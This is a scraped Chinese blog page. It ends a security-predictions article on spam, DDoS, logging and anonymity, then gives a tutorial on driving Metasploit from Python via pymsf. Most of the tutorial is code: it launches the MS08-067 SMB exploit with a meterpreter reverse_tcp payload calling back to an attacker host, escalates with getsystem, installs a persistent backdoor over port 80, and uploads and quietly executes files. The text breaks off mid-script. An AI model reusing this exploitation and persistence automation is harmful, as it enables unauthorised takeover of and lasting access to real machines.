#f8f8f8">垃圾邮件发送者仍旧存在，因为我们很难轻易抓住他们。但随着互联网日益成熟，普适性的匿名将被高可信度的身份所代替。到那时，如果一个人给你发邮件说有一麻袋钱要寄给你，你能够同时确定他是否真的是他。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">只有通过对每个用户的登录都采取双因素验证，才能实现高可信度的身份，然后则是高可信度的计算机和网络。发送者和接受者之间的每一个齿轮都会有更高的可靠性。这种可靠性是通过无处不在的HTTPS提供的，但要确认你就是你，还需要加入额外机制。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">今天，几乎所有人都可以声称自己是某某，而我们并没有普适性的方式来验证他的说法。这将会改变。几乎每一种我们依赖的关键基础设施：交通、电力等等都需要这样的身份凭据。互联网现在还处在狂野西部的时代，但它作为基础设施的本质日益凸现，几乎必然向身份凭据化的方向发展。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">国际边境问题一直在给起诉网络犯罪造成麻烦，它很可能在不久的将来得到解决。目前，许多国家不接受其它国家签发的证据和搜查令，这让逮捕诸如垃圾邮件发送者和存在其它恶意行为的人几近不可能。你可以随便收集证据，但如果攻击者的所在国不执行搜查令，你的案子就完蛋了。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">随着互联网日趋成熟，那些不深挖互联网上最大的犯罪集团的国家将被惩罚。这些国家可能被登入黑名单。事实上，有些国家已经在上面了。举个例子，很多公司和网站都会拒绝所有来自中国的流量，不管它是不是合法。如前所述，一旦我们能够辨认出罪犯和他们的所属国家，其所属国家将被迫作出反应，不然就会受到惩罚。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">垃圾邮件争先恐后地挤满你邮箱的好日子已经到头了。普适性的身份和国际法的变化将给垃圾邮件盖棺，当然还有那些专门打击它们的安全技术。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"><strong style="text-align: center">No.8：抗DDoS</strong></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">值得庆幸的是，上述的普适性身份保护也会为拒绝服务攻击和其相关防御技术鸣起丧钟。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><img style="border: none" class="fit-image" src="read-2.php-5440" tppabs="http://s5.51cto.com/wyfs02/M01/71/98/wKioL1XUTFXSd2wkAAA9GhzkvYQ273.jpg" border="0" alt="640.webp (110)" width="498" height="244" /><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">如今，任何人都可以使用免费的互联网工具，向任意网站发送数以十亿计的数据包。大多数操作系统都内置有拒绝服务攻击保护，也有几十家厂商能够在你被巨量虚假流量攻击时提供保护。但取消普遍的匿名性将制止所有发送拒绝服务流量的攻击者。一旦我们能够找出他们，就可以逮捕他们。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">这样想一想：在上世纪二十年代，美国有很多即猖狂又著名的银行抢劫犯。银行最终加强了他们的防护，警察也能更好地识别和逮捕罪犯。强盗们仍然会袭击银行，但很少抢到钱，而且几乎总能被抓住，特别是当他们坚持要抢更多的银行时。同样的情况也会发生在拒绝服务攻击者身上，只要我们能够快速识别他们，迟早他们会带着那些让人无可奈何、头疼不已的作恶手段消失殆尽。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"><strong style="text-align: center">No.9：大体量事件日志</strong></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">对计算机安全事件进行检测和警报是困难的。每台电脑每天都会产生数以万计的事件。如果将它们都存储在一个集中的日志数据库，你的存储空间很快就会爆炸。如今的事件日志系统通常以其磁盘存储阵列规模巨大而自居。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><img style="border: none" class="fit-image" src="read-2.php-5439" tppabs="http://s1.51cto.com/wyfs02/M01/71/98/wKioL1XUTFXgYdmIAAApmk0CBYs988.jpg" border="0" alt="640.webp (111)" width="498" height="153" /><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">唯一的问题：这类事件日志记录没有用。几乎所有收集到的事件包都没有用并保持着未读状态，存储这些毫无用处的未读文件会带来巨大的存储成本，有些东西必须被放弃。很快，管理员就会要求应用和操作系统厂商提供给他们更多的信号和更少的噪声，去除那些没有价值的通常日志。换句话说，事件日志厂商很快就会开始吹嘘他们占用的存储空间有多小，而不是多大。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"><strong style="text-align: center">No.10：匿名工具</strong></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">最后，任何关于匿名性和隐私的遗迹都将被彻底抹去。我们早就不需要它们了。在这个主题上，推荐一本新书，布鲁斯&middot;施奈尔的《数据与歌利亚》(Data and Goliath)。如果你还没有意识到自己还剩下的隐私和匿名性有多么少，快速阅读它，它可能会吓到你死。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><img style="border: none" class="fit-image" src="read-2.php-5438" tppabs="http://s6.51cto.com/wyfs02/M01/71/9B/wKiom1XUSkiRQWIDAAA64mwJR1Y699.jpg" border="0" alt="640.webp (112)" width="498" height="373" /><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">即使那些认为藏在Tor或者其它&ldquo;暗网&rdquo;设施中能够给自己带来一点匿名性幻觉的黑客也必须了解到警察逮捕网络犯罪者是多么神速。匿名者的中流砥柱们一个个被逮捕，在法庭上被指证，并被判了真实的刑期，有着真实的服刑代码，和他们的真实身份挂钩在一起。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">事实是，匿名工具没有用。很多公司，当然也包括执法部门，已经知道你是谁了。未来唯一不同的是，每个人都会心中有数，停止假装他们能够隐藏自己，在网上保持匿名。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">希望政府能够通过一项保障隐私的消费者权利法案，但过去的经验告诉我们，太多的公民愿意放弃隐私权，换取保护，这已经是除了互联网以外所有其它领域的准则。互联网是不是下一个，我们走着瞧~</p>
	</div>
	<div class="textbox-bottom">
	</div>
	<div class="tags" style="display: none"> 
	</div>
</div><div class="textbox">
	<div class="textbox-calendar">
	<span class="textbox-calendar-month">Mar</span>
	<span class="textbox-calendar-day">20</span>
	</div>
	<div class="textbox-title">
		<h4>
		<a href="read.php-6460.htm" tppabs="http://i.renjihe.com/blog/read.php?6460">教你用Python玩转神器Metasploit</a> <span id="starid6460"><img src="unstarred.gif" tppabs="http://i.renjihe.com/blog/template/default/images/others/unstarred.gif" alt="" title="未加星标" border="0"/></span> <img src="blank.gif" tppabs="http://i.renjihe.com/blog/images/weather/blank.gif" alt="不指定" title="不指定"/>
		</h4>
		<div class="textbox-label">
		<a href="view.php-go=user_1.htm" tppabs="http://i.renjihe.com/blog/view.php?go=user_1" target="_blank">renjihe1988</a> , 17:54 , <a href="index.php-go=category_2.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_2" title="查看分类： 软件">软件</a> &raquo; <a href="index.php-go=category_57.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57" title="查看分类： 网络安全">网络安全</a> , <a href="read.php-6460.htm#reply" tppabs="http://i.renjihe.com/blog/read.php?6460#reply" title="发表您的评论">评论(0)</a> , <a href='javascript: void(0);' title="查看引用地址" onclick='showhidediv("tb6460");'>引用(0)</a> , <a href="read.php-6460.htm" tppabs="http://i.renjihe.com/blog/read.php?6460">阅读(1)</a> , Via 本站原创 
		</div>
	</div>
	<div id="tb6460" style="display: none;" class="textbox-tburl"><strong>引用功能被关闭了。</strong></div>
	
	<div class="textbox-content">
	<p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px"><span style="box-sizing: border-box; color: #262626"><span style="box-sizing: border-box; font-weight: 700">pymsf是著名安全研究团队Spiderlabs实现的一个Python与Metasploit msgrpc进行通信的python模块，通过它，你可以利用Python玩转渗透测试框架Metasploit。</span></span></p><p style="box-sizing: border-box; margin: 15px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px"><span style="box-sizing: border-box; font-size: 18px; color: #000000"><span style="box-sizing: border-box; font-weight: 700">使用步骤</span></span></p><p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px"><span style="box-sizing: border-box; color: #262626"><span style="box-sizing: border-box; font-weight: 700">首先你需要先启动msgrpc服务，命令如下:</span></span></p><pre class="prettyprint lang-as3 prettyprinted" style="box-sizing: border-box; overflow: auto; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: 13px; padding: 8px; margin-top: 0px; margin-bottom: 10px; line-height: 20px; color: #333333; word-break: break-all; word-wrap: break-word; border: 1px solid #e1e1e8; border-radius: 4px; white-space: pre-wrap; background-color: #f7f7f9"><span style="box-sizing: border-box; color: #48484c" class="pln">load&nbsp;msgrpc&nbsp;</span><span style="box-sizing: border-box; color: teal" class="typ">Pass</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=&lt;</span><span style="box-sizing: border-box; color: #48484c" class="pln">password</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">&gt;</span></pre><p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px"><span style="box-sizing: border-box; color: #00b050"><span style="box-sizing: border-box; font-weight: 700">与msgrpc进行通信其实就是与msfconsole进行通信，首先你需要创建一个msfrpc的类,登录到msgrpc服务器并且创建一个虚拟<br />的终端,然后你就可以在你创建的虚拟终端上面执行多个命令的字符串.你可以调用模块的方法与console.write执行命令,并且通<br />过&quot;console.read&quot;从虚拟终端上面读取输入的值.</span></span>这篇文章将演示如何使用pymsf模块并且如何开发出一个完整的脚本.</p><p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px">这里有一个函数它创建了一个msfrpc实例,登录到msgrpc服务器,并且创建了一个虚拟终端.</p><pre class="prettyprint lang-as3 prettyprinted" style="box-sizing: border-box; overflow: auto; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: 13px; padding: 8px; margin-top: 0px; margin-bottom: 10px; line-height: 20px; color: #333333; word-break: break-all; word-wrap: break-word; border: 1px solid #e1e1e8; border-radius: 4px; white-space: pre-wrap; background-color: #f7f7f9"><span style="box-sizing: border-box; color: #1e347b" class="kwd">def</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;sploiter</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LPORT</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;session</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">):</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;client&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;msfrpc</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: teal" class="typ">Msfrpc</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(&#123;&#125;)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">login</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'msf'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">'123'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;ress&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.create'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;console_id&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;ress</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">[</span><span style="box-sizing: border-box; color: #dd1144" class="str">'id'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">]</span></pre><p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px"><span style="box-sizing: border-box; color: #000000"><span style="box-sizing: border-box; font-weight: 700">下一步就是实现把多个字符串发给虚拟终端,通过console.write和console.read在虚拟终端显示与读取:</span></span></p><pre class="prettyprint lang-as3 prettyprinted" style="box-sizing: border-box; overflow: auto; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: 13px; padding: 8px; margin-top: 0px; margin-bottom: 10px; line-height: 20px; color: #333333; word-break: break-all; word-wrap: break-word; border: 1px solid #e1e1e8; border-radius: 4px; white-space: pre-wrap; background-color: #f7f7f9"><span style="box-sizing: border-box; color: #93a1a1" class="com">##&nbsp;Exploit&nbsp;MS08-067&nbsp;##</span><span style="box-sizing: border-box; color: #48484c" class="pln"> commands&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot;use&nbsp;exploit/windows/smb/ms08_067_netapi set&nbsp;PAYLOAD&nbsp;windows/meterpreter/reverse_tcp set&nbsp;RHOST&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; set&nbsp;LHOST&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; set&nbsp;LPORT&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">LPORT</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; set&nbsp;ExitOnSession&nbsp;false exploit&nbsp;-z &quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> </span><span style="box-sizing: border-box; color: #1e347b" class="kwd">print</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;[+]&nbsp;Exploiting&nbsp;MS08-067&nbsp;on:&nbsp;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.write'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">commands</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> res&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.read'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> result&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;res</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">[</span><span style="box-sizing: border-box; color: #dd1144" class="str">'data'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">].</span><span style="box-sizing: border-box; color: #48484c" class="pln">split</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'&#92;n'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span></pre><p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px"><span style="box-sizing: border-box; color: #262626"></span>上面的这一小段代码创建了一个MSF的资源文件,这样你就可以通过&quot;resoucen<br />&quot;命令去执行指定文件里面中一系列的命令。</p><p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px">下面我们将通过&quot;getsystem&quot;命令把这个文件的提权,建立一个后门打开80端口来转发.并且永久的运<br />行.最后上传我们的漏洞exp并且在命令模式下面悄悄的安装:</p><pre class="prettyprint lang-as3 prettyprinted" style="box-sizing: border-box; overflow: auto; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: 13px; padding: 8px; margin-top: 0px; margin-bottom: 10px; line-height: 20px; color: #333333; word-break: break-all; word-wrap: break-word; border: 1px solid #e1e1e8; border-radius: 4px; white-space: pre-wrap; background-color: #f7f7f9"><span style="box-sizing: border-box; color: #93a1a1" class="com">#&nbsp;这个函数会创建一个MSF&nbsp;.rc文件</span><span style="box-sizing: border-box; color: #48484c" class="pln"> </span><span style="box-sizing: border-box; color: #1e347b" class="kwd">def</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;builder</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;LPORT</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">):</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;open</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'/tmp/smbpost.rc'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">'w'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bat&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;open</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'/tmp/ms08067_install.bat'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">'w'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;postcomms&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot;getsystem run&nbsp;persistence&nbsp;-S&nbsp;-U&nbsp;-X&nbsp;-i&nbsp;10&nbsp;-p&nbsp;80&nbsp;-r&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">LHOST</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; cd&nbsp;c:&#92;&#92; upload&nbsp;/tmp/ms08067_patch.exe&nbsp;c:&#92;&#92; upload&nbsp;/tmp/ms08067_install.bat&nbsp;c:&#92;&#92; execute&nbsp;-f&nbsp;ms08067_install.bat &quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;batcomm&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;ms08067_patch.exe&nbsp;/quiet&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">write</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">postcomms</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">);</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;bat</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">write</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #48484c" class="pln">batcomm</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;post</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">close</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">();</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;bat</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">close</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">()</span></pre><p style="box-sizing: border-box; margin: 0px 0px 10px; padding-bottom: 6px; color: #585858; font-family: 微软雅黑; font-size: 14px; line-height: 26px">通过上面的那段代码,将会创建一个.rc的文件.通过msf模块&ldquo;post/multi/gather/run_console_rc_file&rdquo;在当前<br />的meterpreter会话中运行生成的文件,并且通过console.write命令从虚拟终端写入数据,通过console.read命令来回显返回内容:</p><pre class="prettyprint lang-as3 prettyprinted" style="box-sizing: border-box; overflow: auto; font-family: Menlo, Monaco, Consolas, 'Courier New', monospace; font-size: 13px; padding: 8px; margin-top: 0px; margin-bottom: 10px; line-height: 20px; color: #333333; word-break: break-all; word-wrap: break-word; border: 1px solid #e1e1e8; border-radius: 4px; white-space: pre-wrap; background-color: #f7f7f9"><span style="box-sizing: border-box; color: #93a1a1" class="com">##&nbsp;运行生成的exp&nbsp;##</span><span style="box-sizing: border-box; color: #48484c" class="pln"> runPost&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot;use&nbsp;post/multi/gather/run_console_rc_file set&nbsp;RESOURCE&nbsp;/tmp/smbpost.rc set&nbsp;SESSION&nbsp;&quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">session</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;&quot;&quot; exploit &quot;&quot;&quot;</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="box-sizing: border-box; color: #1e347b" class="kwd">print</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;</span><span style="box-sizing: border-box; color: #dd1144" class="str">&quot;[+]&nbsp;Running&nbsp;post-exploit&nbsp;script&nbsp;on:&nbsp;&quot;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">+</span><span style="box-sizing: border-box; color: #48484c" class="pln">RHOST &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.write'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,</span><span style="box-sizing: border-box; color: #48484c" class="pln">runPost</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rres&nbsp;</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">=</span><span style="box-sizing: border-box; color: #48484c" class="pln">&nbsp;client</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">.</span><span style="box-sizing: border-box; color: #48484c" class="pln">call</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #dd1144" class="str">'console.read'</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">,[</span><span style="box-sizing: border-box; color: #48484c" class="pln">console_id</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">])</span><span style="box-sizing: border-box; color: #48484c" class="pln"> </span><span style="box-sizing: border-box; color: #93a1a1" class="com">##&nbsp;Setup&nbsp;Listener&nbsp;for&nbsp;presistent&nbsp;connection&nbsp;back&nbsp;over&nbsp;port&nbsp;80&nbsp;##</span><span style="box-sizing: border-box; color: #48484c" class="pln"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleep</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">(</span><span style="box-sizing: border-box; color: #195f91" class="lit">10</span><span style="box-sizing: border-box; color: #93a1a1" class="pun">)</span><span style="box-sizing: border-box; color: #48484c" class="pln"> 